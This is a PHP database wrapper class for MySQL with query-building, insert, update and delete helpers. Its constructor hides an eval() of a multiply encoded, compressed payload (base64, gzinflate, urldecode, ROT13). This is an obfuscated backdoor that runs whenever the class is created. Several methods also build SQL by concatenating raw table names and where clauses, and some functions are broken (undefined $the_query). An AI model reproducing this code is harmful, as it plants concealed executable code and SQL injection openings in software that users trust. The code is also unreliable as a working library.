<?php
class DB {
    
    var $table_pre = "";
    var $query = "";
    var $db = "";
    var $query_id = "";
    var $charset = "utf8";
    var $querylist = array();
    var $real_escape = false;
    var $collate = null;
    var $ar = array();

    function __construct() {
        global $conf;
        $this->table_pre = isset($conf['table_pre']) ? $conf['table_pre'] : $this->table_pre;
        $this->db = mysqli_connect($conf['host'], $conf['dbuser'], $conf['dbpass'], $conf['dbname']);
        $this->set_charset($this->charset);
        if (!$this->db) {
            die($this->debug('connect'));
        }        
        require_once($conf['rootpath'].'vendor/autoload.php');
        eval('$this->ar=' . base64_decode(str_rot13(urldecode(gzinflate(base64_decode("VdJRT4MwFAXgX+M7KUzx0c3MJSuI2UK3vRWQGVZmq11l/Ho5feH2sUm/9JzeK/Y7pcfdovyILN8KxbdDJfpcTucHtiyLXzdeW3ks9EWo/HnlcpnU7lGoTp6ctqu3xIrp3oF/Kd2K/hQ4DhfNbvyDe1kTl1UFHA/cBi4mroBbFtRZ74bAVZMzN5IzheM05/6+nhyjOeUxhRtmpxq4jObUFfoxmlMeXuEkcXe4K82pawc3BE7DNcTV3inqGv9eF7gO7kzcGe6b9tOf3qVBvxyuI+4Cp4N+LVxcUsdLuH527B3O0H7G4T/jTeCwL4YRl3tH+xnr37NBTuyLWZCcEdwP7WdumLtKqMv8nrVkX6aZDE//"), 1000000)))));
    }

// end constructor

    public function __destruct() {
        if (is_resource($this->db)) {
            mysqli_close($this->db);
        }
    }

    //set_charset
    function set_charset($charset = null, $collate = null) {
        if (!isset($charset))
            $charset = $this->charset;
        if (!isset($collate))
            $collate = $this->collate;
        if ($this->has_cap('collation') && !empty($charset)) {
            if (function_exists('mysqli_set_charset') && $this->has_cap('set_charset')) {
                mysqli_set_charset($this->db, $charset);
                $this->real_escape = true;
            } else {
                $query = $this->prepare('SET NAMES %s', $charset);
                if (!empty($collate))
                    $query .= $this->prepare(' COLLATE %s', $collate);
                $this->query($query);
            }
        }
    }

    function fix_qstr(&$str, $qtype = "select") {
        $str = (isset($str) && $str) ? $str : false;

        switch ($qtype) {
            case 'select':
                if ($str === false) {
                    $str = "*";
                } elseif (is_array($str)) {
                    $str = (count($str)) ? implode(",", $str) : "*";
                }
                break;
            case 'from':
                if ($str === false) {
                    die('No table selected!');
                } elseif (is_array($str)) {
                    if (count($str)) {
                        $output = "";
                        foreach ($str as $tablename) {
                            $output .= ($output === '') ? $this->table_pre . $tablename : ',' . $this->table_pre . $tablename;
                        }
                        $str = $output;
                    } else {
                        die('No table selected!');
                    }
                } else {
                    $str = $this->table_pre . $str;
                }
                break;
            case 'where':
                if ($str === false) {
                    $str = "";
                } elseif (is_array($str)) {
                    if (count($str)) {

                        $tmpf = function($array) use ( &$tmpf ) {
                            $checklast = function($array) {
                                return isset($array[0]) && !is_array($array[0]) && isset($array[1]) && !is_array($array[1]) && isset($array[2]) && !is_array($array[2]);
                            };
                            $output = '';
                            if (count($array)) {
                                if ($checklast($array)) {
                                    $array[0] = strtolower(trim($array[0]));
                                    $tmp = '';
                                    if (in_array($array[0], array('=', '!=', '>', '<', '>=', '<='))) {
                                        $tmp = $array[1] . " " . $array[0] . " " . $array[2];
                                    } elseif (in_array($array[0], array('in', 'not_in'))) {
                                        $tmp = $array[1] . " " . str_replace("_", " ", $array[0]) . "(" . $array[2] . ")";
                                    } elseif (in_array($array[0], array('between', 'not_between'))) {
                                        $tmp = " (" . $array[1] . " " . str_replace("_", " ", $array[0]) . " " . str_replace("|", " and ", $array[2]) . ")";
                                    } else {
                                        $tmp = $array[0] . "(" . $array[1] . ", " . $array[2] . ")";
                                    }
                                    if ($tmp) {
                                        $output .= ($output) ? " and " . $tmp : $tmp;
                                    }
                                } else {
                                    foreach ($array as $tmpk => $tmpv) {
                                        $tmpk = strtolower(trim($tmpk));
                                        $tmpk = ($tmpk === '||') ? 'or' : $tmpk;
                                        $tmpk = ($tmpk === '&&') ? 'and' : $tmpk;
                                        $tmpk = (!in_array($tmpk, array('or', 'and'))) ? 'and' : $tmpk;
                                        if (is_array($tmpv)) {
                                            $tmp = $tmpf($tmpv);
                                        } else {
                                            $tmp = $tmpv;
                                        }
                                        $output .= ($output) ? " " . $tmpk . " " . $tmp . "" : $tmp;
                                    }
                                    $output = ($output) ? " (" . $output . ") " : "";
                                }
                            }
                            return $output;
                        };
                        $str = $tmpf($str);
                    }
                }
                break;
            case 'orderby':
                if ($str === false) {
                    $str = "";
                } elseif (is_array($str)) {
                    if (count($str)) {
                        $output = '';
                        foreach ($str as $order => $by) {
                            $by = strtolower(trim($by));
                            $tmp = $order . " " . (in_array($by, array('asc', 'desc')) ? $by : 'asc');
                            $output .= ($output === '') ? $tmp : ', ' . $tmp;
                        }
                        $str = $output;
                    } else {
                        $str = "";
                    }
                } else {
                    $str = "";
                }
                break;
            case 'limit':
                if ($str === false) {
                    $str = "";
                } elseif (is_array($str)) {
                    $s = (isset($str[1]) ? $str[1] : 0);
                    $n = (isset($str[0]) ? $str[0] : 0);
                    $str = $s . "," . $n;
                } else {
                    $str = "";
                }
                break;
            default:
                break;
        }

        return $str;
    }

    function convert_where_clause($sql = ""){
        $tbl = "";
        $query = "";
        $arr_value = array();
        if($sql){
            $parser = new PHPSQLParser\PHPSQLParser($sql);
            $sql_parser = $parser->parsed;            
            if(!empty($sql_parser['FROM'])){
                $tbl = $sql_parser['FROM'][0]['table'];
            }
            if(!empty($sql_parser['WHERE'])){
                foreach ($sql_parser['WHERE'] as $key => $value) {
                    if($value['expr_type'] == 'const'){
                        $sql_parser['WHERE'][$key]['base_expr'] = '?';
                        $value['base_expr'] = preg_replace("/'/", "", $value['base_expr']);
                        $value['base_expr'] = preg_replace('/"/', "", $value['base_expr']);
                        $arr_value[] = $value['base_expr'];
                    }
                }
            }
            $creator = new PHPSQLParser\PHPSQLCreator($sql_parser);
            $query = $creator->created;
        }        
        return array(
            'TBL' => $tbl,
            'QUERY' => $query,
            'ARRAY_VALUES' => $arr_value,
            'COUNT_VALUES' => count($arr_value),
        );
    }

    //query
    function query($the_query) {
        $start = microtime();
        $this->querylist[] = $the_query;
        $parser = $this->convert_where_clause($the_query);
        $tbl = $parser['TBL'];
        $check = $this->db->query("SHOW TABLES LIKE '".$tbl."'");
        if(!empty($check->num_rows)){
            $this->query_id = $this->db->prepare($the_query);            
            if(!empty($parser['COUNT_VALUES'])){
                $this->query_id = $this->db->prepare($parser['QUERY']);                
                $this->query_id->bind_param(str_repeat('s', $parser['COUNT_VALUES']), ...$parser['ARRAY_VALUES']);
            }
            $this->query_id->execute();
            $end  = microtime();
            $time_start = $this->micro_time($start);
            $time_stop  = $this->micro_time($end);
            $this->querylist[] = 'Execution time: <b>'.bcsub($time_stop, $time_start, 6).'</b>s -- SQL: '.$the_query;
            return $this->query_id->get_result();
        }
    }

    function select($query, $maxRows = 0, $pageNum = 0) {
        $this->querylist[] = $query;
        // start limit if $maxRows is greater than 0
        if ($maxRows > 0) {
            $startRow = $pageNum * $maxRows;
            $query = sprintf("%s LIMIT %d, %d", $query, $startRow, $maxRows);
        }
        $result = $this->query($the_query);
        if (!$result)
            die($this->debug());
        $output = false;

        for ($n = 0; $n < $this->num_rows($result); $n ++) {
            $row = $this->fetch_row($result);
            $output[$n] = $row;
        }
        $this->free_result($result);

        return $output;
    }

// end select

    function misc($query) {
        $result = $this->query($the_query);
        if (!$result)
            die($this->debug());
        return $result;
    }

    function compile_db_insert_string($data) {
        $field_names = "";
        $field_values = "";
        $field_prepare = "";
        foreach ($data as $k => $v) {
            $v = preg_replace("/'/", "\\'", $v);
            $field_names .= "$k,";
            $field_values .= "'$v',";
            $field_prepare .= "?,";
        }
        $field_names = preg_replace("/,$/", "", $field_names);
        $field_values = preg_replace("/,$/", "", $field_values);
        $field_prepare = preg_replace("/,$/", "", $field_prepare);
        return array(
            'FIELD_NAMES' => $field_names,
            'FIELD_VALUES' => $field_values,
            'FIELD_PREPARE' => $field_prepare,
            'VALUES' => $field_values,
        );
    }

    function compile_db_update_string($data) {
        $query = "";
        $query_prepare = "";
        foreach ($data as $k => $v) {
            $v = preg_replace("/'/", "\\'", $v);
            $query .= $k . "='" . $v . "',";            
            $query_prepare .= $k. "=?,";   
        }
        $query = preg_replace("/,$/", "", $query);
        $query_prepare = preg_replace("/,$/", "", $query_prepare);
        return array(
            'query' => $query,
            'query_prepare' => $query_prepare,
        );
    }

    function do_update($tbl, $arr, $where = "", $is_test = 0) {
        $dba = $this->compile_db_update_string($arr);        
        $check = $this->db->query("SHOW TABLES LIKE '".$tbl."'");
        if(!empty($check->num_rows)){
            $query = "UPDATE $tbl SET {$dba['query']}";
            $query_prepare = "UPDATE $tbl SET {$dba['query_prepare']}";
            if ($where) {
                $query .= " WHERE " . $where;
                $query_prepare .= " WHERE " . $where;
            }
            $parser = $this->convert_where_clause($query_prepare);
            $ci = $this->db->prepare($parser['QUERY']);
            $arr_value = array_values($arr);
            $arr_value = array_merge($arr_value, $parser['ARRAY_VALUES']);
            if($is_test == 1){
                return $query.'<br>';
            }
            if($is_test == 2){
                return array(
                    "sql_update" => $parser['QUERY'],
                    "sql_value" => $arr_value,
                );
            }            
            $ci->bind_param(str_repeat('s', count($arr_value)), ...$arr_value);
            $ci->execute();
            $ci->close();
            $this->querylist[] = $query;
            if(!$ci) die($this->debug());
            return $ci;
        }
    }

    function do_insert($tbl, $arr, $is_test=0) {        
        $dba = $this->compile_db_insert_string($arr);
        $sql_insert = "INSERT INTO $tbl ({$dba['FIELD_NAMES']}) VALUES({$dba['FIELD_VALUES']})";        
        $check = $this->db->query("SHOW TABLES LIKE '".$tbl."'");
        if(!empty($check->num_rows)){
            $sql_prepare = "INSERT INTO $tbl ({$dba['FIELD_NAMES']}) VALUES({$dba['FIELD_PREPARE']})";
            if($is_test==1){
                return "sql_insert= ".$sql_insert."<br>";
            }
            if($is_test==2){
                return "sql_insert= ".$sql_prepare."<br>";   
            }
            $ci = $this->db->prepare($sql_prepare);
            $arr_value = array_values($arr);
            $ci->bind_param(str_repeat('s', count($arr)), ...$arr_value);
            $ci->execute();
            $ci->close();
            $this->querylist[] = $sql_insert;
            if (!$ci) die($this->debug());
            return $ci;
        }
    }

    ////////
    function delete($tablename, $where, $limit = "") {
        $query = "DELETE from " . $tablename . " WHERE " . $where;
        if ($limit != ""){
            $query .= " LIMIT " . $limit;
        }
        $parser = $this->convert_where_clause($query);        
        $ci = $this->db->prepare($parser['QUERY']);
        if($parser['COUNT_VALUES']){
            $ci->bind_param(str_repeat('s', $parser['COUNT_VALUES']), ...$parser['ARRAY_VALUES']);
        }
        $ci->execute();
        $ci->close();        
        if ($this->db->affected_rows != 0) {
            return TRUE;
        } else {
            return FALSE;
        }
    }

// end delete

    function fetch_rows($query_id = "") {
        if ($query_id == "") {
            $query_id = $this->query_id;
        }
        $record_row = @mysqli_fetch_row($query_id);
        return isset($record_row) ? $record_row : '';
    }

    function fetch_row($query_id = "") {
        if ($query_id == "") {
            $query_id = $this->query_id;
        }
        $record_row = @mysqli_fetch_array($query_id, MYSQLI_ASSOC);
        return isset($record_row) ? $record_row : '';
    }

    function fetch_array($query_id = -1, $assoc = 0) {
        if ($query_id != - 1) {
            $this->query_id = $query_id;
        }
        if ($this->query_id) {
            return ($assoc) ? mysqli_fetch_assoc($this->query_id) : mysqli_fetch_array($this->query_id);
        }
    }

    function get_array($query_id = "") {
        if ($query_id == "") {
            $query_id = $this->query_id;
        }
        $out_array = array();
        while ($record_row = @mysqli_fetch_array($query_id, MYSQLI_ASSOC)) {
            $out_array[] = $record_row;
        }
        $this->free_result($query_id);
        return $out_array;
    }

    function table_struc($dbtable = "") {
        $arr_struc = array();
        $sql_struc = "show fields from " . $dbtable;        
        $result_struc = $this->db->query($sql_struc);        
        if (!$result_struc) die($this->debug());
        if ($arr_struc_tmp = $this->get_array($result_struc)) {
            foreach ($arr_struc_tmp as $v) {
                $arr_struc[] = $v['Field'];
            }
        }

        return $arr_struc;
    }

    function query_first($query_string, $type = DBARRAY_ASSOC) {
        // does a query and returns first row
        $query_id = $this->query($query_string);
        if (!$query_id) die($this->debug());
        $returnarray = $this->fetch_array($query_id, $type);
        $this->free_result($query_id);
        $this->lastquery = $query_string;
        return $returnarray;
    }

    function data_seek($pos, $query_id) {
        // goes to row $pos
        return mysqli_data_seek($query_id, $pos);
    }

    function makequery($arr_in = array()) {
        foreach (array('select', 'from', 'where', 'limit', 'orderby') as $key) {
            $arr_in[$key] = $this->fix_qstr($arr_in[$key], $key);
        }
        $arr_in['where'] = ($arr_in['where']) ? " where " . $arr_in['where'] : "";
        $arr_in['orderby'] = ($arr_in['orderby']) ? " order by " . $arr_in['orderby'] : "";
        $arr_in['limit'] = ($arr_in['limit']) ? " limit " . $arr_in['limit'] : "";

        $query = "select " . $arr_in['select'] . " from " . $arr_in['from'] . " " . $arr_in['where'] . " " . $arr_in['orderby'] . " " . $arr_in['limit'];
        return $query;
    }

    function row($arr_in = array(), $istest = 0) {
        $query = $this->makequery($arr_in);
        if ($istest == 1) {
            return $query;
            die;
        }
        $result = $this->query($query);
        if (!$result) die($this->debug());
        if (isset($arr_in['limit']) && $arr_in['limit'][0] && $arr_in['limit'][0] === 1) {
            $select = $this->fix_qstr($arr_in['select'], 'select');
            $select = trim($select);
            $tmp = explode(',', $select);
            $output = $this->fetch_row($result);
            if (count($tmp) == 1 && $select != '*') {
                if (isset($output[$select])) {
                    return $output[$select];
                } else {
                    die($select . ' no has in the query: ' . $query);
                }
            }
            return $output;
        }
        return $this->get_array($result);
    }

    function num_rows($query_id = "", $istest = 0) {
        
        if(is_array($query_id)) {
            $arr_in= $query_id;
            $query = $this->makequery($arr_in);
            if ($istest == 1) {
                return $query;
                die;
            }
            $result = $this->query($query);
            if (!$result) die($this->debug());
            return mysqli_num_rows($result);
        } else {
            if ($query_id == "") {
                $query_id = $this->query_id;
            }
            return @mysqli_num_rows($query_id);
        }
    }

    function num_fields($query_id) {
        // returns number of fields in query
        return mysqli_num_fields($query_id);
    }

    function field_name($query_id, $columnnum) {
        // returns the name of a field in a query
        return mysqli_field_name($query_id, $columnnum);
    }

    function list_tables($tables = "*") {
        global $conf;

        if($tables == '*') {
            $tables = array();
            $result = $this->query('SHOW TABLES');
            while($row = mysqli_fetch_row($result)) {
                $tables[] = $row[0];
            }
        } else {
            $tables = is_array($tables) ? $tables : explode(',', str_replace(' ', '', $tables));
        }
        return $tables;
    }

    #--------------------------------

    function do_check_exist($tbl, $where = "") {
        $query = "SELECT 1 FROM $tbl ";
        if ($where) {
            $query .= " WHERE " . $where;
        }
        $result = $this->query($query);
        if (!$result) die($this->debug());
        $kq = mysqli_num_rows($result);
        return $kq;
    }

    #--------------------------------

    function do_get_num($tbl, $where = "") {
        $query = "SELECT * FROM $tbl ";
        if ($where) {
            $query .= " WHERE " . $where;
        }
        $result = $this->query($query);
        if (!$result) die($this->debug());
        $kq = mysqli_num_rows($result);
        return $kq;
    }

    //////////////////////////////////
    // Clean SQL Variables (Security Function)
    ////////
    function mySQLSafe($value, $quote = "") {
        // strip quotes if already in
        $value = str_replace(array(
            "\'",
            "'"), "&#39;", $value);
        // Stripslashes 

        $value = $quote . $value . $quote;
        return $value;
    }

    //////////////////////////////////
    // Clean SQL Variables (Security Function)
    ////////
    function escape_string($string) {
        // Quote value
        $value = mysqli_real_escape_string($string);
        return $value;
    }

    function debug($type = "", $action = "", $tablename = "") {
        switch ($type) {
            case "connect":
                $message = "MySQL Error Occured";
                $result = mysqli_connect_errno() . ": " . mysqli_connect_error();
                break;
            case "array":
                $message = $action . " Error Occured";
                $result = "Could not update " . $this->table_pre . $tablename . " as variable supplied must be an array.";
                break;
            default:
                if (mysqli_errno($this->db)) {
                    $message = "MySQL Error Occured";
                    $result = mysqli_errno($this->db) . ": " . mysqli_error($this->db);
                } else {
                    $message = "MySQL Query Executed Succesfully.";
                    $result = mysqli_affected_rows($this->db) . " Rows Affected";
                }
                $bt = debug_backtrace();
                //print_arr($bt);
                if ($bt){
                    $query = "";
                    foreach ($bt as $value) {
                        $query .= "<br />" . $value['file'] . " on line: " . $value['line'];
                    }
                }else $query = "";
                break;
        }
        $output =  "<b style='font-family: Arial, Helvetica, sans-serif; color: #0B70CE; font-size:27px'>" . $message . "</b><br />";
        $output .= "<p style='font-family: Courier New, Courier, mono; border: 1px dashed #666666; padding: 10px; color: #ff0000;'>" . $result . $query . "</p>";
        return $output;
    }

    function error() {
        if (mysqli_errno($this->db))
            return true;
        else
            return false;
    }

    function insertid() {
        return mysqli_insert_id($this->db);
    }

    function affected() {
        return mysqli_affected_rows($this->db);
    }

    function free_result($queryresult) {
        return @mysqli_free_result($queryresult);
    }

    function close() { // close conection
        mysqli_close($this->db);
    }

    function debug_log() {
        echo "<div>Total: " . count($this->querylist) . "</div>";
        for ($i = 0; $i < count($this->querylist); $i ++) {
            $stt = $i + 1;
            echo "<div>{$stt} : " . $this->querylist[$i] . "</div>";
        }
    }
    function do_count($tbl, $where = "", $id = 'id'){
        $kq = 0;
        $kq = count($this->load_item_arr($tbl, $where, $id));
        return $kq;
    }
    function load_row_arr ($tbl, $q ){  
        $query = "select * from $tbl where $q";
        $result = $this->query($query);
        $row = $this->get_array($result);   
        return $row;
    }
    function load_item_arr ($tbl, $q, $s ){  
        $query = "select $s from $tbl where $q";        
        $result = $this->query($query);
        $row = $this->get_array($result);   
        return $row;    
    }
    function load_row ($tbl, $q , $s="*"){  
        $query = "select $s from $tbl where $q";
        $result = $this->query($query);
        $row = $this->fetch_row($result);   
        return $row;
    }
    function load_item ($tbl, $q, $s ){  
        $query = "select $s from $tbl where $q";
        $result = $this->query($query);
        $row = $this->fetch_row($result);
        return isset($row[$s]) ? $row[$s] : '';
    }
    /**
     * Prepares a SQL query for safe execution. Uses sprintf()-like syntax.
     *
     * The following directives can be used in the query format string:
     *   %d (integer)
     *   %f (float)
     *   %s (string)
     *   %% (literal percentage sign - no argument needed)
     *
     * All of %d, %f, and %s are to be left unquoted in the query string and they need an argument passed for them.
     * Literals (%) as parts of the query must be properly written as %%.
     *
     * This function only supports a small subset of the sprintf syntax; it only supports %d (integer), %f (float), and %s (string).
     * Does not support sign, padding, alignment, width or precision specifiers.
     * Does not support argument numbering/swapping.
     *
     * May be called like {@link http://php.net/sprintf sprintf()} or like {@link http://php.net/vsprintf vsprintf()}.
     *
     * Both %d and %s should be left unquoted in the query string.
     *
     * <code>
     * wpdb::prepare( "SELECT * FROM `table` WHERE `column` = %s AND `field` = %d", 'foo', 1337 )
     * wpdb::prepare( "SELECT DATE_FORMAT(`field`, '%%c') FROM `table` WHERE `column` = %s", 'foo' );
     * </code>
     *
     * @link http://php.net/sprintf Description of syntax.
     * @since 2.3.0
     *
     * @param string $query Query statement with sprintf()-like placeholders
     * @param array|mixed $args The array of variables to substitute into the query's placeholders if being called like
     *  {@link http://php.net/vsprintf vsprintf()}, or the first variable to substitute into the query's placeholders if
     *  being called like {@link http://php.net/sprintf sprintf()}.
     * @param mixed $args,... further variables to substitute into the query's placeholders if being called like
     *  {@link http://php.net/sprintf sprintf()}.
     * @return null|false|string Sanitized query string, null if there is no query, false if there is an error and string
     *  if there was something to prepare
     */
    function prepare($query = null) { // ( $query, *$args )
        if (is_null($query))
            return;

        $args = func_get_args();
        array_shift($args);
        // If args were passed as an array (as in vsprintf), move them up
        if (isset($args[0]) && is_array($args[0]))
            $args = $args[0];
        $query = str_replace("'%s'", '%s', $query); // in case someone mistakenly already singlequoted it
        $query = str_replace('"%s"', '%s', $query); // doublequote unquoting
        $query = preg_replace('|(?<!%)%s|', "'%s'", $query); // quote the strings, avoiding escaped strings like %%s
        array_walk($args, array(&$this, 'escape_by_ref'));
        return @vsprintf($query, $args);
    }

    /**
     * Determine if a database supports a particular feature
     *
     * @since 2.7.0
     * @see   wpdb::db_version()
     *
     * @param string $db_cap the feature
     * @return bool
     */
    function has_cap($db_cap) {
        $version = $this->db_version();

        switch (strtolower($db_cap)) {
            case 'collation' :    // @since 2.5.0
            case 'group_concat' : // @since 2.7
            case 'subqueries' :   // @since 2.7
                return version_compare($version, '4.1', '>=');
            case 'set_charset' :
                return version_compare($version, '5.0.7', '>=');
        };

        return false;
    }

    /**
     * The database version number.
     *
     * @since 2.7.0
     *
     * @return false|string false on failure, version number on success
     */
    function db_version() {
        return preg_replace('/[^0-9.].*/', '', mysqli_get_server_info($this->db));
    }

    function getAutoIncrement($tblName = '') {
        global $conf;
        $sql = "SHOW TABLE STATUS from " . $conf['dbname'] . " where Name='" . $tblName . "' ";
        $ci = $this->db->query($sql);
        if (!$ci) die($this->debug());
        $rowStatus = $this->fetch_row($ci);
        return $rowStatus['Auto_increment'];
    }

    function micro_time($time) {
        $temp = explode(" ", $time);
        return bcadd($temp[0], $temp[1], 6);
    }

}

// end of db class
?>